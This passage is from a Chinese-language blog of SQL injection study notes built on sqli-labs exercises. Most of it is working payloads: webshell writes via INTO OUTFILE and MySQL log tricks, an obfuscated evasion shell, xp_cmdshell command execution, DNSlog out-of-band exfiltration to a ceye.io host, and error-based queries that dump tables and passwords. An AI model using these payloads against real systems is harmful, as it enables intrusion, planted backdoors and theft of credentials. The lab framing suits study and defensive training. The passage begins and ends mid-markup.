class="headerlink" title="读写问题：魔术引号开关"></a>读写问题：魔术引号开关</h4><ul><li><p>概念</p><p>魔术引号设计的初衷是为了让从数据库或文件中读取数据和从请求中接收参数时，<u>对单引号、双引号、反斜线、NULL加上一个反斜线进行转义</u>，这个的作用跟addslashes()的作用完全相同。addslashes()函数返回在预定义字符之前添加反斜杠的字符串。</p><p>在phpstudy中，该开关为参数magic_quotes_gpc，在php.ini的990行左右。</p><p>其实由于不是所有数据都需要转义，出于性能的考虑，魔术引号开关在PHP5.4.0及其之后PHP版本中被取消了，在运行时调用转义函数（如 addslashes()）会更有效率。</p><img src="/posts/Users/cbcao/AppData/Roaming/Typora/typora-user-images/image-20220726165029504.png" alt="image-20220726165029504" style="zoom:67%;"></li><li><p>影响</p><p>如果开启魔术引号，则上传语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,load_file(&#x27;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs-master\\sql-lab.sql&#x27;),3</span><br></pre></td></tr></table></figure><p>会被转义成如下内容，使SQL注入命令失效：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,load_file(\&#x27;D:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\sqli-labs-master\\\\sql-lab.sql\&#x27;),3</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726165127494.png" alt="image-20220726165127494"></p></li><li><p>绕过</p><p><strong>可以把引号所包含的路径内容（不要单引号）编码为hex进行绕过</strong>。</p><p>绕过原理：sql可以识别并执行用hex表示的语句</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726165729917.png" alt="image-20220726165729917"></p></li></ul><h3 id="利用SQL注入执行命令"><a href="#利用SQL注入执行命令" class="headerlink" title="利用SQL注入执行命令"></a>利用SQL注入执行命令</h3><p><a href="https://www.cnblogs.com/feiquan/p/8673093.html">https://www.cnblogs.com/feiquan/p/8673093.html</a></p><p>借助 xp_cmdshell 运行cmd命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">USE master</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE --先执行一次刷新，处理上次的配置</span><br><span class="line">GO</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1 --启用xp_cmdshell的高级配置</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE --刷新配置</span><br><span class="line">GO</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1  --打开xp_cmdshell,可以调用SQL系统之外的命令</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line">--使用xp_cmdshell在D盘创建一个myfile 文件夹</span><br><span class="line">EXEC xp_cmdshell &#x27;mkdir d:\myfile&#x27;,no_output --[no_output]表示是否输出信息</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p>SQLserver执行系统命令的几种方式：<a href="https://www.cnblogs.com/Azjj/p/14019312.html">https://www.cnblogs.com/Azjj/p/14019312.html</a></p><ul><li><p><strong>xp_cmdshell</strong></p></li><li><p><strong>SP_OACREATE</strong></p></li><li><p><strong>通过沙盒执行命令</strong></p></li></ul><h3 id="x3D-x3D-SQL注入写webshel-x3D-x3D"><a href="#x3D-x3D-SQL注入写webshel-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;SQL注入写webshel&#x3D;&#x3D;"></a>&#x3D;&#x3D;SQL注入写webshel&#x3D;&#x3D;</h3><p><a href="https://blog.csdn.net/huangyongkang666/article/details/123728115">https://blog.csdn.net/huangyongkang666/article/details/123728115</a></p><h4 id="上传webshell文件"><a href="#上传webshell文件" class="headerlink" title="上传webshell文件"></a>上传webshell文件</h4><p>上传文件的条件：</p><ol><li>网站物理路径；</li><li>文件写入的权限；</li><li>secure_file_priv 不为 NULL；</li></ol><p>secure_file_priv&#x3D;NULL时，无法导入导出文件；而当设置不为空时，导入导出文件不受限制；如果设置为某个文件路径，如secure_file_priv&#x3D;&#x2F;mysql&#x2F;时，则导入导出必须要在该文件目录下完成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select &#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;’ into outfile &#x27;D:/WWW/evil.php&#x27;</span><br><span class="line"></span><br><span class="line">?id=1 union select 1,&quot;&lt;?php @eval($_POST[&#x27;g&#x27;]);?&gt;&quot;,3 into outfile &#x27;D:/WWW/evil.php&#x27;</span><br><span class="line"></span><br><span class="line">?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile &quot;D:/WWW/evil.php&quot;</span><br></pre></td></tr></table></figure><h4 id="利用分隔符写入"><a href="#利用分隔符写入" class="headerlink" title="利用分隔符写入"></a>利用分隔符写入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1 into outfile &#x27;D:/WWW/evil.php&#x27; fields terminated by &#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span><br><span class="line"></span><br><span class="line">?id=1 into outfile &#x27;D:/WWW/evil.php&#x27; lines terminated by &#x27;&lt;?php phpinfo() ?&gt;&#x27;--+</span><br><span class="line"></span><br><span class="line">?id=1 LIMIT 0,1 INTO OUTFILE &#x27;D:/WWW/evil.php&#x27; lines terminated by 0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27 --+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; lines terminated by  （一句话hex编码）#</span><br><span class="line"></span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; fields terminated by （一句话hex编码）#</span><br><span class="line"></span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; columns terminated by （一句话hex编码）#</span><br><span class="line"></span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; lines starting by    （一句话hex编码）#</span><br></pre></td></tr></table></figure><h4 id="利用日志写入"><a href="#利用日志写入" class="headerlink" title="利用日志写入"></a>利用日志写入</h4><p>新版本的MySQL设置了导出文件的路径，很难在获取Webshell过程中去修改配置文件，无法通过使用select into outfile来写入一句话。这时，我们可以通过修改MySQL的log文件来获取Webshell。</p><p>利用条件：</p><ul><li>对web目录有写权限</li><li>GPC关闭(GPC:是否对单引号转义)</li><li>有绝对路径(读文件可以不用，写文件需要)</li><li>需要能执行多行SQL语句</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;             # 查看配置</span><br><span class="line"></span><br><span class="line">set global general_log = on;               # 开启general log模式,将所有到达MySQL Server的SQL语句记录下来。</span><br><span class="line"></span><br><span class="line">set global general_log_file = &#x27;D:/WWW/evil.php&#x27;; # 设置日志目录为shell地址</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php eval($_GET[g]);?&gt;&#x27;              # 写入shell</span><br><span class="line"></span><br><span class="line">set global general_log=off;                   # 关闭general log模式</span><br></pre></td></tr></table></figure><p>在高版本的mysql中默认为NULL，就是不让导入和导出</p><p>解决办法：</p><p>在Windows下可在my.ini的[mysqld]里面，添加secure_file_priv</p><p>在linux下可在&#x2F;etc&#x2F;my.cnf的[mysqld]里面，添加secure_file_priv</p><p>使用慢查询日志绕过此限制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;;#查看慢查询日志开启情况</span><br><span class="line"></span><br><span class="line">set global slow_query_log=1#开启慢查询日志</span><br><span class="line"></span><br><span class="line">set global slow_query_log_file=&#x27;D:/phpStudy/WWW/evil.php;    #修改日志文件存储的绝对路径</span><br><span class="line"></span><br><span class="line">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; or sleep(11);#写入shell</span><br><span class="line"></span><br><span class="line">show global variables like &#x27;%long_query_time%&#x27;; #使用慢查询日志时，只有当查询时间超过系统时间(默认为10秒)时才会记录在日志中，使用如下语句可查看系统时间</span><br></pre></td></tr></table></figure><p>免杀shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php $p = array(&#x27;f&#x27;=&gt;&#x27;a&#x27;,&#x27;pffff&#x27;=&gt;&#x27;s&#x27;,&#x27;e&#x27;=&gt;&#x27;fffff&#x27;,&#x27;lfaaaa&#x27;=&gt;&#x27;r&#x27;,&#x27;nnnnn&#x27;=&gt;&#x27;t&#x27;);$a = array_keys($p);$_=$p[&#x27;pffff&#x27;].$p[&#x27;pffff&#x27;].$a[2];$_= &#x27;a&#x27;.$_.&#x27;rt&#x27;;$_(base64_decode($_REQUEST[&#x27;cmd&#x27;]));?&gt;&quot;</span><br></pre></td></tr></table></figure><h2 id="6-SQL注入进阶"><a href="#6-SQL注入进阶" class="headerlink" title="6. SQL注入进阶"></a>6. SQL注入进阶</h2><h3 id="x3D-x3D-堆叠注入-x3D-x3D"><a href="#x3D-x3D-堆叠注入-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;堆叠注入&#x3D;&#x3D;"></a>&#x3D;&#x3D;堆叠注入&#x3D;&#x3D;</h3><p><a href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a></p><p>stacked injections（堆叠注入）就是多条sql语句一起执行。在mysql 中，一条语句结尾加<code>;</code>表示语句结束，多语句之间以分号隔开。堆叠注入就是利用这个特点，在第二个SQL语句中构造自己要执行的语句。</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users; select * from emails;</span><br></pre></td></tr></table></figure><p>将堆叠注入运用于创建用户，以此迂回得到自定义的账户密码。但是前提是网站的管理员必须是高权限才能完全创建用户。也可以使用update更新管理员用户密码。</p><p><code>id=1&#39;;insert into users(id,username,password) values ( 39, &#39;less38 &#39;, &#39;hello &#39;)--+</code></p><p>当网站使用PDO技术（一种防护手段）执行SQL语句时，可以执行多语句，不过这样通常不能直接得到注入结果，因为PDO只会返回第一条SQL语句执行的结果， 所以在第二条语句中可以用update更新数据或者使用时间盲注获取数据。</p><p><code>id=1&#39;;select if(substr(user(),1,1)=&#39;r&#39;, sleep(3), 1)--+</code></p><h3 id="加解密编码注入"><a href="#加解密编码注入" class="headerlink" title="加解密编码注入"></a>加解密编码注入</h3><p>某些注入点会对参数值进行编码。比如下面的cookie进行了base64编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /Less-21/index.php HTTP/1.1</span><br><span class="line">Host: 10.1.1.133</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://10.1.1.133/Less-21/index.php</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: uname=YWRtaW4%3D</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p><code>YWRtaW4%3D</code>是一个base64加密的字符串，其中%3D是编码中的<code>=</code>符号，把他发送到编码模块当中解密，得到明文admin。</p><p>所以构造好注入语句后，也需要进行编码，也就是说<code>admin&#39; and 1=1</code>加密之后的值是<code>YWRtaW4nIGFuZCAxPTE=</code>。</p><p>而获取数据库名称的报错盲注的语句<code>admin&#39; or updatexml(1,concat(0x7e,(database())),0) or &#39;</code>加密后cookie值<code>Cookie: uname=YWRtaW4nIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChkYXRhYmFzZSgpKSksMCkgb3IgJwo=</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728092746776.png"></p><h3 id="二次注入（绕过转义）"><a href="#二次注入（绕过转义）" class="headerlink" title="二次注入（绕过转义）"></a>二次注入（绕过转义）</h3><p>（sqlilabs less 24）</p><p>二次注入原理，主要分为两步</p><ul><li><p>第一步：插入恶意数据</p><p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据。但是，数据本身包含恶意内容。</p></li><li><p>第二步：引用恶意数据</p><p>在将数据存入到了数据库中之后。开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一 步的检验和处理，这样就会造成SQL的二次注入。</p><p>在前端和URL（黑盒测试）是无法发现二次注入，无法用工具扫描，<u>只有在代码审计时才能发现是否存在二次注入，也就是提前知道所插入的恶意数据的类型，在哪里被SQL利用</u>。</p></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/d03f2d86af5e7aee0e09c2379236aa52378eac48.png@812w_395h_progressive.webp" alt="img"></p><p><strong>举例：</strong></p><p>比如<u>已经通过代码审计知道</u>，网页有注册和查询&#x2F;更改密码的功能，并且：</p><p>注册页面会在后台执行insert语句<code>insert into user(id,username,pwd) values(2,’x’,’123’)</code></p><p>更改密码，则包含update语句<code>upadte user set pwd=’123456’ where id=2 and username=’admin’</code>。</p><p>在注册页面网站使用了addslashes进行了特殊字符的转义，所以无法直接进行注入。但是也因此可以插入一些恶意数据，比如使用<code>admin&#39; and 1=1#</code>作为用户名进行注册。</p><p>那么在更新密码页面，就会执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upadte user set pwd=’123’ where id=2 and username=&#x27;admin&#x27; and 1=1#&#x27;</span><br></pre></td></tr></table></figure><p>同理，如果换成注册其它用户名，更新的时候也会形成不同的注入语句。</p><p>比如使用<code>dhakkan&#39;#</code>作为用户名注册，那么更新密码时就会执行：</p><p><code>upadte user set pwd=’sss’ where username=&#39;dhakkan&#39;#&#39;</code></p><p>被更新密码的账户从<code>dhakkan&#39;#</code>变成了<code>dhakkan</code>。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/4bdb21dc2e0d6958a868d38e4560a7de15dfa1c8.png@461w_92h_progressive.webp" alt="img"></p><p>以此类推，可以借助用户名来爆数据库信息：</p><p>若输入用户名：<code>&#39; or updatexml(1,concat(0x7e,version()),0) or’</code> 和密码：123</p><p>那么更新密码的SQL就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`update users set pwd=&#x27;sss&#x27; where username=&#x27;&#x27; or updatexml(1,concat(0x7e,version()),0) or&#x27;&#x27; and password=&#x27;123456&#x27;</span><br></pre></td></tr></table></figure><p>但是网站有时会限制用户名长度，如果是在前端限制，可以修改Maxlength，如果是后端代码进行的限制，则无法成功注入。</p><h3 id="load-file-amp-DNSlog注入（解决无回显）"><a href="#load-file-amp-DNSlog注入（解决无回显）" class="headerlink" title="load_file&amp;DNSlog注入（解决无回显）"></a>load_file&amp;DNSlog注入（解决无回显）</h3><p>sqlilabs-less9-load_file&amp;dnslog 带外注入（实际案例）</p><p><strong>dnslog解决了盲注不能回显数据，效率低的问题</strong></p><p><strong>原理</strong>：<code>load_file</code>支持对外的<strong>文件读取</strong>，通过在URL中加入SQL语句，可以<u>借助读取DNS访问记录得到SQL语句的执行结果</u>。</p><p>比如构造如下语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and if((select load_file(concat(&#x27;////&#x27;,(select version()),&#x27;.yk2kql.ceye.io//abc&#x27;))),0,1)--+</span><br></pre></td></tr></table></figure><p><strong>工具</strong>：<a href="http://ceye.io，注册后可以获得个人的DNS地址：">http://ceye.io，注册后可以获得个人的DNS地址：</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/9ded59fe90f60d1cdb4049308f40ac2abe13467b.png@725w_165h_progressive.webp" alt="img"></p><p>成功注入之后，可以在ceye.io网站看到所访问的链接，其中包含了version()数据库版本信息5.5.53.1。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728101718259.png" alt="image-20220728101718259"></p><p>或者查看数据库名称：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and if((select load_file(concat(&#x27;////&#x27;,(select database()),&#x27;.yk2kql.ceye.io//abc&#x27;))),0,1)--+</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814095417887.png" alt="image-20220814095417887"></p><p>参考资料：<a href="https://www.cnblogs.com/xhds/p/12322839.html">https://www.cnblogs.com/xhds/p/12322839.html</a></p><p>使用DnsLog盲注仅限于windos环境。</p><ul><li><p><strong>使用工具DnslogSqlinj</strong></p><p><a href="https://github.com/ADOOO/DnslogSqlinj">https://github.com/ADOOO/DnslogSqlinj</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728102540802.png" alt="image-20220728102540802"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728102804316.png" alt="image-20220728102804316"></p><p>获取数据库名称：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728103014120.png" alt="image-20220728103014120"></p></li></ul><h3 id="宽字节注入（绕过转义）"><a href="#宽字节注入（绕过转义）" class="headerlink" title="宽字节注入（绕过转义）"></a>宽字节注入（绕过转义）</h3><p>当网站对参数进行了转义时，单引号等会被转义符（反斜杠）转义，导致攻击语句失效。所以在一般情况下，此处是不存在SQL注入漏洞的。</p><p>不过有一个特例，就是当数据库的编码为GBK时，可以使用宽字节注入，宽字节的格式是在单引号前会先加个%df。这样就变成了<code>id=1%df&#39;</code>，经过转义就是<code>id=1%df%5c&#39;</code>。因为反斜杠的编码为%5c，而在GBK编码中，%df%5c是繁体字”連”，所以这时，单引号成功被读入。</p><p>所以可以构造攻击语句：<code>id=1%df&#39; and 1=1%23</code>进行注入点的判断。</p><h3 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h3><p>XFF是HTTP请求头中的一个头部参数X-Forwarded- for。X- Forwarded- For简称XFF头，它代表客户端真实的IP。</p><p>通过修改X-Forwarded-for的值可以伪造客户端IP，将X Forwarded -for设置为127.0.0.1，然后访问该URL，页面返回正常。</p><p>如果网站有通过诸如$_SERVER之类的函数获取XFF，并用于SQL语句，那么就可以尝试进行注入。</p><p>比如构造攻击语句：<code>X Forwarded -for=127.0.0.1&#39; union select 1,2,3,4#</code></p><h2 id="7-SQL注入类型"><a href="#7-SQL注入类型" class="headerlink" title="7. SQL注入类型"></a>7. SQL注入类型</h2><h3 id="按照注入方式"><a href="#按照注入方式" class="headerlink" title="按照注入方式"></a>按照注入方式</h3><h4 id="普通注入和盲注"><a href="#普通注入和盲注" class="headerlink" title="普通注入和盲注"></a>普通注入和盲注</h4><p>普通注入就是注入的<u>页面是直接显示数据库中的字段内容的</u>，我们可以通过 SQL 注入一步一步把数据库中我们想要的内容显示在页面中。</p><p>盲注则要困难很多，<u>页面不直接显示数据库字段内容</u>，显示的可能只是一个判断结果（是或者否），页面只能告诉你你构造的 SQL 语句对还是错，你要查询的内容存在还是不存在。</p><p>其中不回显的原因可能是 SQL 语句的问题导致，因为像insert、delete等查询语句即使执行成功，也不会回显。此外，网站的前端页面显示也会限制。</p><ul><li><p>select 查询数据</p><p>例：<code>select * from news where id=$id</code></p><p>应用：查询用户</p></li><li><p>insert 插入数据</p><p>例：<code>insert into users(id,username,password) values(30,&#39;x&#39;,&#39;123&#39;)</code></p><p>应用：网站的用户注册</p><p>和select操作的数据包相似，但是不能像普通select注入一样操作。</p></li><li><p>delete 删除数据</p><p>例：<code>delete from users where id=30</code></p><p>应用：后台管理里面删除用户等操作、删除留言等</p></li><li><p>update 更新数据</p><p>例：<code>update users set password=&#39;123&#39; where id=11 and username=&#39;admin3&#39;</code></p><p>应用：会员或后台中心数据同步或缓存等操作、登录后修改个人信息，如密码等</p></li><li><p>order by 排序数据</p><p>一般结合表名或列名进行数据排序操作</p><p>例：select * from news order by $id</p><p>例：select id,name,price from news order by $order</p></li></ul><h4 id="基于报错的SQL盲注（优先）"><a href="#基于报错的SQL盲注（优先）" class="headerlink" title="基于报错的SQL盲注（优先）"></a>基于报错的SQL盲注（优先）</h4><p>12种报错注入+万能语句：<a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p><p>floor、extractvalue、updatexml报错原理：<a href="https://developer.aliyun.com/article/692723">https://developer.aliyun.com/article/692723</a></p><ul><li><p><strong>floor向下取整数</strong></p><p>0x7e为<code>~</code></p><p>rand() 产生[0,1)的随机小数；</p><p>group by 按照指定字段对查询结果进行分组，常结合count()、sum()、avg()、max()、min()等使用。</p><p>利用了MySQL的第8652号bug ：Bug #8652 group by part of rand() returns duplicate key error来进行的盲注，使得MySQL由于函数的特性返回错误信息，进而我们可以显示我们想要的信息，从而达到注入的效果：在 <strong>rand()和group by同时使用</strong> 的时候，可能会产生超出预期的结果，因为会<u>多次对同一列进行查询</u>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">//select</span><br><span class="line">// 爆数据库版本</span><br><span class="line">1&#x27; and (select count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">// 通过修改limit后面数字一个一个爆表</span><br><span class="line">1&#x27; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">// 爆出所有表</span><br><span class="line">1&#x27; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">// 爆出所有字段名</span><br><span class="line">1&#x27; and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x7e,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">// 爆出所有字段名</span><br><span class="line">1&#x27; and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">//爆出该账户的密码。</span><br><span class="line">1&#x27; and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username=&#x27;admin1&#x27;),0x7e,floor(rand(0)*2)))a)# </span><br><span class="line"></span><br><span class="line">//insert</span><br><span class="line">username=x&#x27; or (select 1 from (select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;</span><br><span class="line"></span><br><span class="line">//update</span><br><span class="line">add=hubeNicky&#x27; or (select 1 from (select count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or &#x27;</span><br><span class="line"></span><br><span class="line">// delete</span><br><span class="line">id=56+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a)</span><br><span class="line">// 由于是在数据包中编辑，所以用+代替空格，避免歧义</span><br></pre></td></tr></table></figure><p>报错结果如下，显示出了数据库名称：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727195036461.png" alt="image-20220727195036461"></p></li><li><p><code>extractvalue(xml_frag, xpath_expr)</code></p><p>xml_frag为XML标记片段，xpath_expr表示从XML字符串中匹配元素。如果xpath_expr格式语法书写错误的话，就会报错，输出xpath_expr。利用这个特性可以构造注入点。</p><p>利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</p><p>![1551928141656](<a href="https://blogs-pic.oss-cn-beijing.aliyuncs.com/images/2019-03-07">https://blogs-pic.oss-cn-beijing.aliyuncs.com/images/2019-03-07</a> 报错注入：extractvalue、updatexml&#x2F;1551928141656.png?x-oss-process&#x3D;style&#x2F;shuiyin)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// insert</span><br><span class="line">username=x&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27;</span><br><span class="line"></span><br><span class="line">// update</span><br><span class="line">add=hubeNicky&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27;</span><br><span class="line"></span><br><span class="line">// delete</span><br><span class="line">?id=56+or+extractvalue(1,concat(0x7e,database()))</span><br></pre></td></tr></table></figure><p>其中的concat()函数是将其参数连成一个字符串，因此不会符合xpath_expr的格式，从而出现格式错误，爆出</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727193832420.png" alt="image-20220727193832420"></p></li><li><p><code>UpdateXML(xml_document, xpath_expr, new_xml)</code></p><p>xml_document：String格式，为XML文档对象的名称</p><p>xpath_expr：Xpath格式的字符串</p><p>new_xml：String格式，替换查找到的符合条件的数据</p><p>作用：改变文档中符合条件的节点的值，即改变XML_document中符合XPATH_string的值</p><p>此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为新的XML片段 new_xml，然后返回更改的XML。xml_document替换的部分 与xpath_expr用户提供的XPath表达式匹配。</p><p>如果未xpath_expr找到表达式匹配，或者找到多个匹配项，则该函数返回原始xml_document的XML片段。所有三个参数都应该是字符串。</p><p>和上面的extractvalue函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1551929714141.png" alt="1551929714141"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// insert</span><br><span class="line">username=x&#x27; or updatexml(1,concat(0x7e,(version())),0) or &#x27;</span><br><span class="line"></span><br><span class="line">// update</span><br><span class="line">add=hubeNicky&#x27; or  updatexml(1,concat(0x7e,(version())),0) or &#x27;</span><br><span class="line"></span><br><span class="line">// delete</span><br><span class="line">?id=56+or+updatexml+(1,concat(0x7e,database()),0)</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727195708498.png" alt="image-20220727195708498"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727195718450.png" alt="image-20220727195718450"></p></li></ul><h4 id="基于布尔的SQL盲注（其次）"><a href="#基于布尔的SQL盲注（其次）" class="headerlink" 